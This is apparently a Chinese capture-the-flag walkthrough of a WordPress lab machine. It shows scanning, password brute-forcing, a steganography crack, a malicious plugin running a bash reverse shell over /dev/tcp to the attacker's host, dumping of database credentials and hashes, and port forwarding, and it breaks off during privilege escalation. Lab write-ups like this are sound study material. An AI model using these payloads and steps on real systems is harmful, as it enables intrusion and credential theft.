https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).\n | Found By: Rss Generator (Passive Detection)\n |  - http://offensive.thl/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n |  - http://offensive.thl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n\n[+] WordPress theme in use: gentlemens-club\n | Location: http://offensive.thl/wp-content/themes/gentlemens-club/\n | Latest Version: 1.0.0 (up to date)\n | Last Updated: 2024-09-25T00:00:00.000Z\n | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt\n | [!] Directory listing is enabled\n | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css\n | Style Name: Gentlemen's Club\n | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...\n | Author: masino1967\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.0.0 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'\n\n[+] Enumerating Vulnerable Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 <=========================================================> (10 / 10) 100.00% Time: 00:00:00\n\n[i] User(s) Identified:\n\n[+] administrator\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By:\n |  Wp Json Api (Aggressive Detection)\n |   - http://offensive.thl/index.php/wp-json/wp/v2/users/?per_page=100&page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 0\n | Requests Remaining: 19\n\n[+] Finished: Wed Jan  1 12:52:18 2025\n[+] Requests Done: 56\n[+] Cached Requests: 8\n[+] Data Sent: 11.653 KB\n[+] Data Received: 288.726 KB\n[+] Memory used: 268.75 MB\n[+] Elapsed time: 00:00:19\n                                                  \n```\n\n\u83b7\u5f97\u4e00\u4e2a\u7528\u6237\u540d`administrator`\uff0c\u5c31\u6ca1\u6709\u5176\u4ed6\u91cd\u8981\u7684\u4fe1\u606f\u4e86\uff0c\u6211\u4eec\u8fdb\u884c\u7206\u7834\u4e00\u4e0b\u5bc6\u7801\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wpscan --url http://offensive.thl -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   #api-token\u6ce8\u518cwpscan\u5b98\u7f51\u83b7\u53d6\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://offensive.thl/ [192.168.205.220]\n[+] Started: Wed Jan  1 12:54:01 2025\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.62 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).\n | Found By: Rss Generator (Passive Detection)\n |  - http://offensive.thl/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n |  - http://offensive.thl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n\n[+] WordPress theme in use: gentlemens-club\n | Location: http://offensive.thl/wp-content/themes/gentlemens-club/\n | Latest Version: 1.0.0 (up to date)\n | Last Updated: 2024-09-25T00:00:00.000Z\n | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt\n | [!] Directory listing is enabled\n | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css\n | Style Name: Gentlemen's Club\n | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...\n | Author: masino1967\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.0.0 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:00 <========================================================> (137 / 137) 100.00% Time: 00:00:00\n\n[i] No Config Backups Found.\n\n[i] Could not find a login interface to perform the password attack against\n\n[i] No Valid Passwords Found.\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 0\n | Requests Remaining: 18\n\n[+] Finished: Wed Jan  1 12:54:04 2025\n[+] Requests Done: 142\n[+] Cached Requests: 39\n[+] Data Sent: 29.128 KB\n[+] Data Received: 21.362 KB\n[+] Memory used: 245.344 MB\n[+] Elapsed time: 00:00:03\n                   \n\n\n[i] Could not find a login interface to perform the password attack against\n\n[i] \u65e0\u6cd5\u627e\u5230\u767b\u5f55\u754c\u9762\u6765\u6267\u884c\u5bc6\u7801\u653b\u51fb\n```\n\n\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u627e\u4e0d\u5230\uff0c\u6211\u4e5f\u65e0\u6cd5\u8bbf\u95ee\u767b\u5f55\u70b9\uff0c\u90a3\u6211\u4eec\u53bb\u63a2\u6d4b\u4e00\u4e0b**8080**\u7aef\u53e3\u5427\u3002\n\n\u6253\u5f00\u7f51\u5740\uff0c\u4ed6\u8bf4\u65e0\u6cd5GET /\t\u600e\u4e48\u770b\u8d77\u6765\u50cfAPI\u5440\uff0c\u76ee\u5f55\u7206\u7834\u4e00\u4e0b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://offensive.thl:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://offensive.thl:8080/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/help                 (Status: 200) [Size: 203]\n/cat                  (Status: 500) [Size: 31]\n/Help                 (Status: 200) [Size: 203]\n/ls                   (Status: 200) [Size: 176]\n/rm                   (Status: 500) [Size: 45]\n/Cat                  (Status: 500) [Size: 31]\nProgress: 49633 / 6369165 (0.78%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 51095 / 6369165 (0.80%)\n===============================================================\nFinished\n===============================================================\n\n```\n\n\u67e5\u770b\u4e00\u4e0b\u5e2e\u52a9\u3002\n\n![image](https://github.com/user-attachments/assets/aa4bd96d-99b6-4f0c-b204-76a776e4eddb)\n\n\u53ef\u4ee5\u4e0b\u8f7d\u3001\u67e5\u770b\u3001\u5220\u9664\uff0c\u4f46\u662f\u9650\u5236\u5728`/var/www`\uff0c\u90a3\u6211\u4eec\u67e5\u770b\u4e00\u4e0b\u6709\u4ec0\u4e48\u6587\u4ef6\u3002\n\n![image](https://github.com/user-attachments/assets/82d60f3a-df63-4105-b95a-8121ca79dea5)\n\n\u6709\u610f\u601d\uff0c\u6211\u4eec\u770b\u770b**wordress**\u4e2d\u6709\u6ca1\u6709\u6211\u4eec\u6ca1\u6709\u63a2\u6d4b\u51fa\u6765\u7684**plugins**\u3002\n\n![image](https://github.com/user-attachments/assets/4bd23546-7d72-4ac2-9b55-f3d7b2fa032a)\n\n\u771f\u591a\u554a\uff0c\u6211\u6bd4\u8f83\u5bf9`akismet`\u3001`wps-hide-login`\u3001`wpterm`\u611f\u5174\u8da3\uff0c\u641c\u7d22\u4e00\u4e0b\u4ed6\u4eec\u6709\u6ca1\u6709\u6f0f\u6d1e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit akismet\n----------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                       |  Path\n----------------------------------------------------------------------------------------------------- ---------------------------------\nWordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities                             | php/webapps/37902.php\nWordPress Plugin Akismet 2.1.3 - Cross-Site Scripting                                                | php/webapps/30036.html\n----------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit wps-hide-login \nExploits: No Results\nShellcodes: No Results\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit wpterm     \nExploits: No Results\nShellcodes: No Results\n                                \n```\n\n\u53ea\u6709\u4e00\u4e2a\u8de8\u7ad9\u70b9\uff0c\u6211\u4eec\u7528\u4e0d\u4e0a\uff0c\u4f46\u662f\u6211\u53d1\u73b0\u4e86\u70b9\u95ee\u9898\uff0c`wps-hide-login`\u662f\u4ec0\u4e48\u4e1c\u897f\u554a\uff0c\u89e6\u53d1\u4e86\u6211\u5173\u952e\u8bcd\uff0c\u641c\u7d22\u4e00\u4e0b\u3002\n\n![image](https://github.com/user-attachments/assets/a014b2ce-d98a-4762-b648-65d6dbdb956b)\n\n\u539f\u6765\u5c31\u662f\u4f60\u8ba9\u6211\u7206\u7834\u4e0d\u4e86[\u751f\u6c14]\uff0c\u8fdb\u4f60\u76ee\u5f55\u770b\u770b\u3002\n\n![image](https://github.com/user-attachments/assets/40a293ec-8fc3-474b-92fe-4d19af4a276f)\n\n\u5f97\u5230\u4e86\u4e00\u4e2a\u7248\u672c\u53f7\uff0c\u6211\u53bb\u641c\u7d22\u4e86\u4e00\u4e0b`wps-hide-login`\u7684exploit\uff0c\u6ca1\u6709\u8fd9\u4e2a\u7248\u672c\u7684\uff0c\u8fd9\u4e2a\u662f\u6700\u65b0\u7248\uff0c\u96be\u529e\u4e86......\n\n\u6211\u5ffd\u7136\u60f3\u5230\u4e00\u4e2a\u95ee\u9898\uff0c\u4ee5\u524d\u642d\u535a\u5ba2\u52a0\u63d2\u4ef6\u7684\u8bdd\uff0c\u5982\u679c\u90a3\u4e2a\u63d2\u4ef6\u4e0d\u8981\u4e86\uff0c\u76f4\u63a5\u628a\u90a3\u4e2a\u76ee\u5f55\u5220\u4e86\u5b83\u5c31\u4f1a\u6d88\u5931\uff0c\u6211\u4e0d\u77e5\u9053**WordPress**\u662f\u4e0d\u662f\u8fd9\u79cd\u673a\u5236\uff0c\u8bd5\u8bd5\u5427\uff0c\u4e0d\u884c\u5c31\u91cd\u88c5\n\n![image](https://github.com/user-attachments/assets/ab524259-acc2-4c3f-820e-620e26da7e1b)\n\n\u5c1d\u8bd5\u53ef\u4e0d\u53ef\u4ee5\u767b\u5f55\u3002\n\n![image](https://github.com/user-attachments/assets/b6592349-bf94-430b-ad0c-214e4b453084)\n\n\u8fd8\u771f\u884c\uff0c\u518d\u7206\u7834\u4e00\u6b21\u5bc6\u7801\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wpscan --url http://offensive.thl:80 -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   #api-token\u6ce8\u518cwpscan\u5b98\u7f51\u83b7\u53d6\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://offensive.thl/ [192.168.205.220]\n[+] Started: Wed Jan  1 13:23:14 2025\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.62 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).\n | Found By: Rss Generator (Passive Detection)\n |  - http://offensive.thl/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n |  - http://offensive.thl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n\n[+] WordPress theme in use: gentlemens-club\n | Location: http://offensive.thl/wp-content/themes/gentlemens-club/\n | Latest Version: 1.0.0 (up to date)\n | Last Updated: 2024-09-25T00:00:00.000Z\n | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt\n | [!] Directory listing is enabled\n | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css\n | Style Name: Gentlemen's Club\n | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...\n | Author: masino1967\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.0.0 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:00 <========================================================> (137 / 137) 100.00% Time: 00:00:00\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Wp Login against 1 user/s\n^Cying administrator / ripper Time: 00:01:13 <                                                > (9060 / 14344392)  0.06%  ETA: 32:11:33\n[i] No Valid Passwords Found.\n\n^Cying administrator / reyrey Time: 00:01:13 <                                                > (9063 / 14344392)  0.06%  ETA: 32:11:19\nScan Aborted: Canceled by User\n                           \n```\n\n9000+\u90fd\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u90a3\u610f\u601d\u662f\u5728\u4ec0\u4e48\u5730\u65b9\u85cf\u7740\uff1f\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wget -r -np http://offensive.thl    \n--2025-01-01 13:26:20--  http://offensive.thl/\n\u6b63\u5728\u89e3\u6790\u4e3b\u673a offensive.thl (offensive.thl)... 192.168.205.220\n\u6b63\u5728\u8fde\u63a5 offensive.thl (offensive.thl)|192.168.205.220|:80... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a\u672a\u6307\u5b9a [text/html]\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201coffensive.thl/index.html\u201d\n\n```\n\n\u4e0b\u8f7d\u4e86\u4e00\u4efd\u7f51\u9875\u6ca1\u6709\u7ed3\u679c\uff0c\u6211\u8bb0\u5f97\u597d\u50cf\u90a3\u4e2aAPI\u53ef\u4ee5\u4e0b\u8f7d\u6765\u7740\uff0c\u4e0b\u8f7d\u4e00\u4efd\u4e0b\u6765\u3002\n\n![image](https://github.com/user-attachments/assets/49ced356-5769-4985-b669-e50f078a45ab)\n\n\u5148\u5e1d\u521b\u4e1a\u672a\u534a\u800c\u4e2d\u9053\u5d29\u6b82\uff0cmmp\uff0c\u90a3\u6ca1\u529e\u6cd5\u4e86\uff0c\u5c31\u5728\u8fd9\u4e2aAPI\u63a2\u7d22\u5427\u3002\n\n![image](https://github.com/user-attachments/assets/e2d52fcf-8201-41ec-9a5b-3c5551238f38)\n\n\u5728`/image/`\u76ee\u5f55\u4e0b\u627e\u5230\u4e00\u4e2a\u6709\u610f\u601d\u7684\u56fe\u7247\u3002\n\n![image](https://github.com/user-attachments/assets/15bb561b-0c31-4141-8f36-47cfb5b579d7)\n\n\u554a\u8fd9......\u5c5e\u5b9e\u662f\u6587\u5316\u8f93\u51fa\u4e86\uff0c\u54c8\u54c8\u54c8\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wget http://offensive.thl/images/wp-login.jpg                     \n--2025-01-01 13:34:42--  http://offensive.thl/images/wp-login.jpg\n\u6b63\u5728\u89e3\u6790\u4e3b\u673a offensive.thl (offensive.thl)... 192.168.205.220\n\u6b63\u5728\u8fde\u63a5 offensive.thl (offensive.thl)|192.168.205.220|:80... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a648072 (633K) [image/jpeg]\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201cwp-login.jpg\u201d\n\nwp-login.jpg                      100%[============================================================>] 632.88K  --.-KB/s  \u7528\u65f6 0.001s  \n\n2025-01-01 13:34:42 (477 MB/s) - \u5df2\u4fdd\u5b58 \u201cwp-login.jpg\u201d [648072/648072])\n\n                                                                              \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ exiftool wp-login.jpg \nExifTool Version Number         : 13.00\nFile Name                       : wp-login.jpg\nDirectory                       : .\nFile Size                       : 648 kB\nFile Modification Date/Time     : 2024:12:25 04:24:46+08:00\nFile Access Date/Time           : 2025:01:01 13:34:42+08:00\nFile Inode Change Date/Time     : 2025:01:01 13:34:42+08:00\nFile Permissions                : -rw-rw-r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nResolution Unit                 : None\nX Resolution                    : 1\nY Resolution                    : 1\nImage Width                     : 3840\nImage Height                    : 2160\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)\nImage Size                      : 3840x2160\nMegapixels                      : 8.3\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ stegseek wp-login.jpg \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: 'bestfriend'\n[i] Original filename: 'wp-login.txt'.\n[i] Extracting to 'wp-login.jpg.out'.\n\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat wp-login.jpg.out\nuFQ07kmjImx$)x9HHH3J3Sa5\n                    \n```\n\n\u767b\u4e0a\u53bb\u4e86\uff0c\u63d0\u6743\u5c31\u7b80\u5355\u4e86\uff0c\u4f20\u4e2aPlugins Shell\u4e0a\u53bb\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat wp_reverse.php \n<?php\n\n/**\n* Plugin Name: Reverse Shell Plugin\n* Plugin URI:\n* Description: Reverse Shell Plugin\n* Version: 1.0\n* Author: Vince Matteo\n* Author URI: http://www.sevenlayers.com\n*/\n\nexec('/bin/bash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'');\n?>\n                         \n```\n\n\u538b\u6210\u538b\u7f29\u5305\u5f53\u63d2\u4ef6\u4f20\u4e0a\u53bb\u5c31\u597d\u4e86\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888                         \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.220] 57678\nbash: cannot set terminal process group (798): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@TheHackersLabs-Offensive:/var/www/wordpress/wp-admin$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n```\n\n---\n\n## 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6\u53cd\u5411 shell \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n---\n\n## 4.\u63d0\u6743\n\n```bash\nwww-data@TheHackersLabs-Offensive:/tmp$ ss -ntlup\nNetid                State                 Recv-Q                 Send-Q                                 Local Address:Port                                 Peer Address:Port                Process                                    \nudp                  UNCONN                0                      0                                            0.0.0.0:68                                        0.0.0.0:*                                                              \ntcp                  LISTEN                0                      4096                                         0.0.0.0:5000                                      0.0.0.0:*                                                              \ntcp                  LISTEN                0                      511                                          0.0.0.0:8080                                      0.0.0.0:*                    users:(('node',pid=561,fd=18))            \ntcp                  LISTEN                0                      128                                          0.0.0.0:22                                        0.0.0.0:*                                                              \ntcp                  LISTEN                0                      80                                         127.0.0.1:3306                                      0.0.0.0:*                                                              \ntcp                  LISTEN                0                      128                                             [::]:22                                           [::]:*                                                              \ntcp                  LISTEN                0                      511                                                *:80                                              *:*                                                              \n\n```\n\n\u5f00\u4e86\u4e2a3306,\u770b\u770b\u6709\u4ec0\u4e48\uff0c\u8fd9\u53ef\u4ee5\u67e5\u5230\u4ed6\u7684mysql\u5bc6\u7801\n\n```bash\nwww-data@TheHackersLabs-Offensive:/tmp$ cat /var/www/wordpress/wp-config.php \n<?php\n/**\n * The base configuration for WordPress\n *\n * The wp-config.php creation script uses this file during the installation.\n * You don't have to use the website, you can copy this file to 'wp-config.php'\n * and fill in the values.\n *\n * This file contains the following configurations:\n *\n * * Database settings\n * * Secret keys\n * * Database table prefix\n * * ABSPATH\n *\n * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/\n *\n * @package WordPress\n */\n\n// ** Database settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'wordpress' );\n\n/** Database username */\ndefine( 'DB_USER', 'wp_user' );\n\n/** Database password */\ndefine( 'DB_PASSWORD', 'wpManoloPass' );\n\n/** Database hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8' );\n\n/** The database collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n\n/**#@+\n * Authentication unique keys and salts.\n *\n * Change these to different unique phrases! You can generate these using\n * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.\n *\n * You can change these at any point in time to invalidate all existing cookies.\n * This will force all users to have to log in again.\n *\n * @since 2.6.0\n */\ndefine( 'AUTH_KEY',         'put your unique phrase here' );\ndefine( 'SECURE_AUTH_KEY',  'put your unique phrase here' );\ndefine( 'LOGGED_IN_KEY',    'put your unique phrase here' );\ndefine( 'NONCE_KEY',        'put your unique phrase here' );\ndefine( 'AUTH_SALT',        'put your unique phrase here' );\ndefine( 'SECURE_AUTH_SALT', 'put your unique phrase here' );\ndefine( 'LOGGED_IN_SALT',   'put your unique phrase here' );\ndefine( 'NONCE_SALT',       'put your unique phrase here' );\n\n/**#@-*/\n\n/**\n * WordPress database table prefix.\n *\n * You can have multiple installations in one database if you give each\n * a unique prefix. Only numbers, letters, and underscores please!\n *\n * At the installation time, database tables are created with the specified prefix.\n * Changing this value after WordPress is installed will make your site think\n * it has not been installed.\n *\n * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix\n */\n$table_prefix = 'wp_';\n\n/**\n * For developers: WordPress debugging mode.\n *\n * Change this to true to enable the display of notices during development.\n * It is strongly recommended that plugin and theme developers use WP_DEBUG\n * in their development environments.\n *\n * For information on other constants that can be used for debugging,\n * visit the documentation.\n *\n * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/\n */\ndefine( 'WP_DEBUG', false );\n\n/* Add any custom values between this line and the 'stop editing' line. */\n\n\n\n/* That's all, stop editing! Happy publishing. */\n\n/** Absolute path to the WordPress directory. */\nif ( ! defined( 'ABSPATH' ) ) {\n        define( 'ABSPATH', __DIR__ . '/' );\n}\n\n/** Sets up WordPress vars and included files. */\nrequire_once ABSPATH . 'wp-settings.php';\n\n```\n\n\u67e5\u770bmysql\u6709\u6ca1\u6709\u654f\u611f\u4fe1\u606f\n\n```bash\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n| wordpress          |\n+--------------------+\n5 rows in set (0.001 sec)\n\nMariaDB [(none)]> use mysql;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [mysql]> show tables;\n+---------------------------+\n| Tables_in_mysql           |\n+---------------------------+\n| column_stats              |\n| columns_priv              |\n| db                        |\n| event                     |\n| func                      |\n| general_log               |\n| global_priv               |\n| gtid_slave_pos            |\n| help_category             |\n| help_keyword              |\n| help_relation             |\n| help_topic                |\n| index_stats               |\n| innodb_index_stats        |\n| innodb_table_stats        |\n| plugin                    |\n| proc                      |\n| procs_priv                |\n| proxies_priv              |\n| roles_mapping             |\n| servers                   |\n| slow_log                  |\n| table_stats               |\n| tables_priv               |\n| time_zone                 |\n| time_zone_leap_second     |\n| time_zone_name            |\n| time_zone_transition      |\n| time_zone_transition_type |\n| transaction_registry      |\n| user                      |\n+---------------------------+\n\nMariaDB [mysql]> SELECT user, host, authentication_string FROM mysql.user;\n+-------------+-----------+-------------------------------------------+\n| User        | Host      | authentication_string                     |\n+-------------+-----------+-------------------------------------------+\n| mariadb.sys | localhost |                                           |\n| root        | localhost | invalid                                   |\n| mysql       | localhost | invalid                                   |\n| wp_user     | localhost | *41D869A459C5FC17FE6786D4B639FE7FE528DCC2 |\n+-------------+-----------+-------------------------------------------+\n4 rows in set (0.001 sec)\n\nMariaDB [wordpress]> show tables;\n+-----------------------+\n| Tables_in_wordpress   |\n+-----------------------+\n| wp_commentmeta        |\n| wp_comments           |\n| wp_links              |\n| wp_options            |\n| wp_postmeta           |\n| wp_posts              |\n| wp_term_relationships |\n| wp_term_taxonomy      |\n| wp_termmeta           |\n| wp_terms              |\n| wp_usermeta           |\n| wp_users              |\n+-----------------------+\n12 rows in set (0.000 sec)\n\nMariaDB [wordpress]> SELECT user_login, user_pass FROM wp_users;\n+---------------+------------------------------------+\n| user_login    | user_pass                          |\n+---------------+------------------------------------+\n| administrator | $P$BPzDdGMVlbK3gPYUUVtbvf0roz4rxX/ |\n+---------------+------------------------------------+\n1 row in set (0.000 sec)\n\n\n```\n\n\u4e0b\u73ed\uff0c\u4ec0\u4e48\u90fd\u6ca1\u6709\u3002\u5b9e\u5728\u627e\u4e0d\u5230\u7529\u4e86\u4e00\u4e2alinpeas.sh\u8fc7\u6765,\u6ca1\u6709\u4ec0\u4e48\u6709\u4ef7\u503c\u7684\u4e1c\u897f\uff0c\u4f46\u662f\u6211\u5728\u770blinpeas\u62a5\u544a\u7684\u65f6\u5019\u518d\u770b\u4e86\u4e00\u8fb9\u5f00\u653e\u7684\u7aef\u53e3\u53d1\u73b05000\u7aef\u53e3\u662f\u5f00\u653e\u7684\uff0c\u800c\u4e14\u6211nmap\u63a2\u6d4b\u6ca1\u63a2\u6d4b\u51fa\u6765\uff0c\u5e94\u8be5\u7384\u673a\u5c31\u5728\u8fd9\u91cc\uff0c\u5148\u8f6c\u53d1\u51fa\u53bb\u5148\n\n```bash\nwww-data@TheHackersLabs-Offensive:/tmp$ socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:5000 &\n[1] 20694\n\n```\n\n![image](https://github.com/user-attachments/assets/df8f29f1-fe16-41a2-9bc6-66542f3465bb)\n\n\u7206\u7834PIN,\u4e5f\u5c3110000\u79cd\u53ef\u80fd\uff08\u5982\u679c\u4f60\u662f\u901a\u8fc7\u4ee3\u7406\u7684\u5f62\u5f0f\u8f6c\u53d1\u7aef\u53e3\u5982:`chisel`\u8fd9\u79cd\uff0c\u6211\u5efa\u8bae\u4f60\u76f4\u63a5\u6284\u6211\u7684PIN\uff0c\u56e0\u4e3a\u4ee3\u7406\u5de8\u6162\uff0c\u4e0d\u8981\u95ee\u4e3a\u4ec0\u4e48\u6211\u77e5\u9053\uff0c\u56e0\u4e3a\u6211\u4e00\u5f00\u59cb\u5c31\u662f\u8fd9\u6837\u5e72\u7684\uff09\n\n![image](https://github.com/user-attachments/assets/822a8467-e878-4a48-84a9-9f1c8fa38d1c)\n\nPIN\u4e3a3333\u7684\u65f6\u5019\u957f\u5ea6\u660e\u663e\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5c31\u662f3333\u3002\n\n![image](https://github.com/user-attachments/assets/d46a4cc8-8700-4796-baa2-336f1cda0846)\n\n\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff0c\u5f39\u4e2ashell\u56de\u6765\u3002\n\n```bash\nmaria@TheHackersLabs-Offensive:~$ id\nuid=1001(maria) 